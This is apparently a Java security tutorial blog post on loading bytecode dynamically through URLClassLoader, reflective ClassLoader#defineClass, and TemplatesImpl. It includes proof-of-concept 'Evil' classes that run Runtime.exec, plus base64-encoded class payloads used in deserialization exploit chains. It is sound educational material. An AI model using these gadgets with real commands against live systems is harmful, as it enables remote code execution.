# Java Security Learning—Dynamic Loading Bytecode

Author: H3rmesk1t

# Java Bytecode Definition
> `Java`ByteCode (ByteCode) refers to a type of instructions used by the `Java` virtual machine, which is usually stored in the `.class` file.

> Virtual machine providers have released many `JVM` virtual machines that can run on different platforms. These VMs have a common function, that is, they can load and execute the same platform-independent bytecode (ByteCode). The source code no longer has to be translated into `0` and `1` according to different platforms, but indirectly translated into bytecode. The files that store the bytecode are then handed over to the `JVM` virtual machines running on different platforms for reading and execution, thus achieving the purpose of writing and running everywhere at once. The semantics of various variables, keywords and operators in the source code will eventually be compiled into multiple bytecode commands. The semantic description ability provided by bytecode commands is significantly stronger than that of `Java` itself, so some other languages ​​that are also based on `JVM` can provide many language features that are not supported by `Java`.

<img src="./images/1.png" alt="">

# Load remote class files using URLClassLoader
> `URLClassLoader` is actually the parent class of `AppClassLoader` that is used by default. Under normal circumstances, Java will find the `.class` file to load according to the basic paths listed in the configuration items `sun.boot.class.path` and `java.class.path` (these paths are processed `java.net.URL` class) and `java.class.path`. These paths are divided into three cases.

```java
[1] The URL does not end with a slash/, and it is considered to be a JAR file. Use JarLoader to find the class, that is, to find the .class file in the Jar package
[2] The URL ends with a slash/ and the protocol name is file, then use the FildLoader to find the class, that is, to find the .class file in the local system.
[3] The URL ends with a slash/ and the protocol name is not a file, use the most basic Loader to find the class
```

> To use the underlying `Loader` class to find this, it must be a non-file protocol. - `JAVA` defaults to provide support for `file`, `ftp`, `gopher`, `http`, `https`, `jar`, `mailto`, `netdoc` protocols

> Use the `http` protocol to test

```java
Malicious

package URLClassLoaderDemo;

import java.io.*;
/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 4:25 pm
 */
public class Evil {
    public Evil() throws IOException {
        Runtime.getRuntime().exec("open -a /System/Applications/Calculator.app");
    }
}
```
> Remote `HTTP` server code

```java
package URLClassLoaderDemo;

import java.net.URL;
import java.net.MalformedURLException;
import java.net.URLClassLoader;
import java.lang.ClassNotFoundException;
import java.lang.InstantiationException;
import java.lang.IllegalAccessException;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 3:22 pm
 */
public class HttpServer {
    public static void main(String[] args) throws IllegalAccessException, InstantiationException, MalformedURLEXception, ClassNotFoundException {
        URL[] urls = {new URL("http://localhost:2222/")};
        URLClassLoader loader = URLClassLoader.newInstance(urls);
        Class _class = loader.loadClass("Evil");
        _class.newInstance();
    }
}
```

<img src="./images/2.png" alt="">

# Use ClassLoader#defineClass to directly load bytecode files
> Whether it is loading a remote `class` or a local `class` or `jar` file, Java` experiences calls to the following three methods: `ClassLoader#loadClass-->ClassLoader#findClass->ClassLoader#defineClass`

<img src="./images/3.png" alt="">

```java
[1] The function of loadClass is to find from the loaded class cache, parent loader, etc. (parent delegation mechanism). If it is not found before, execute findClass
[2] The purpose of findClass is to load the bytecode of the class according to the URL specified. It may read the bytecode on the local system, jar package or remote http server and then hand it over to defineClass
[3] The function of defineClass is to process the bytecode passed in before and process it into a real Java class
```

> First compile the `.class` file of the malicious class, and then use `defineClass` to load it
> It should be noted that the class returned by `ClassLoader#defineClass` will not be initialized. Only when this object explicitly calls its constructor initialization code can it be executed, so you need to find a way to call the constructor of the returned class to execute the command; in actual scenarios, because the scope of the `defineClass` method is not open, attackers rarely use it directly, but it is the cornerstone of a commonly used attack chain `TemplatesImpl`

```java
package URLClassLoaderDemo;

import java.lang.reflect.Method;

import java.lang.*;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 5:05 pm
 */
public class DefineClassLoader {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWA QAKU291cmNlRmlsZQEACUV2aWwuamF2YQwABwAIBwAXDAAYABkBACtvcGVuIC1hIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAaABsBAARFdmlsAQAQamF2YS9sYW5nL09iamV jdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylM amF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAABwAEAAgADQAJAAsAAAAEAAEADAABAA0AAAACAA4");
        Class Evil = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "Evil", code, 0, code.length);
Evil.newInstance();
    }
}
```

<img src="./images/4.png" alt="">

# Load bytecode using TemplatesImpl
> In many Java deserialization exploitation chains, as well as fastjson and jackson vulnerabilities, TemplatesImpl has appeared. Although most upper-level developers do not directly use the `defineClass` method, and the scope of the `java.lang.ClassLoader` is not open (protected), there are still classes at the bottom of Java (for example, TemplatesImpl`) that use it.

> This `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` class defines an internal class: `TransletClassLoader`

> You can see that this class inherits the `ClassLoader`, and it also rewrites the `defineClass` method and does not explicitly define the scope of the method. By default in `Java`, if a method does not explicitly declare the scope, its scope is `default`, so that the `defineClass` here has changed from the `protected` type of its parent class to a `default` type method, so it can be called outside the class.

<img src="./images/5.png" alt="">

> When analyzing `TemplatesImpl`, I have already learned that there are two call stacks in `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` about `TransletClassLoader#defineClass()`.

```java
[1] TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()

[2] TemplatesImpl#getOutputProperties() ->TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
```

> The first two methods `TemplatesImpl#getOutputProperties()`, and the scope of `TemplatesImpl#newTransformer()` is `public`, which can be called externally. Try to use `new Transformer()` to construct a simple `POC`

```java
package URLClassLoaderDemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.*;
import java.io.*;
import java.lang.reflect.Field;
import javax.xml.transform.*;
import java.util.Base64;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 5:39 pm
 */
public class TemplatesImplLoader {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException {
        String shell = "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFj aGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveG FsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAB5FdmlsT2ZUZW1wbGF0ZXNsbXBsTG9hZGVyLmphdmEMAAcACAcAHAwAHQAeAQApb3BlbiAtYSAvU3lzdGVtL0FwcGxpY2F0aW9ucy9UZXh0RWRpdC5hcHAMAB 8AIAEALFVSTENsYXNzTG9hZGVyRGVtby9FdmlsT2ZUZW1wbGF0ZXNsbXBsTG9hZGVyAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEv aW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUn VudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADwAEABAA DQARAAsAAAEADAABAA0ADgACAAAAAAAZAAAAWAAAAAGxAAAAAQAKAAAAABgABAAAAAFQALAAAAAABAA8AAQANABAAAAGAAAAAAAABsQAAAAAAAAAAAAAAAAAFQALAAAAABAA8AAQANABAAAAGAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEg==";
        byte[] shellCode = Base64.getDecoder().decode(shell);

        TemplatesImpl templates = new TemplatesImpl();
        Class c1 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field _name = c1.getDeclaredField("_name");
        Field _bytecode = c1.getDeclaredField("_bytecodes");
        Field _tfactory = c1.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, new byte[][]{shellCode});
        _tfactory.set(templates, new TransformerFactoryImpl());

        templates.newTransformer();
    }
}
```

<img src="./images/6.png" alt="">
> Here `_tfactory` needs to be a `TransformerFactoryImpl` object, because the `TemplatesImpl#defineTransletClasses()` method is called to `_tfactory.getExternalExtensionsMap()`. If the value is `null`, it will cause an error.

<img src="./images/7.png" alt="">

<img src="./images/8.png" alt="">

> It is also worth noting that the loaded bytecode in `TemplatesImpl` has certain requirements: the class corresponding to this bytecode must be a subclass of `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`. For example, the code of a malicious class is as follows

```java
package URLClassLoaderDemo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;
/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 5:52 pm
 */
public class EvilOfTemplateslmplLoader extends AbstractTranslet {
    public EvilOfTemplateslmplLoader() throws IOException {
        Runtime.getRuntime().exec("open -a /System/Applications/TextEdit.app");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```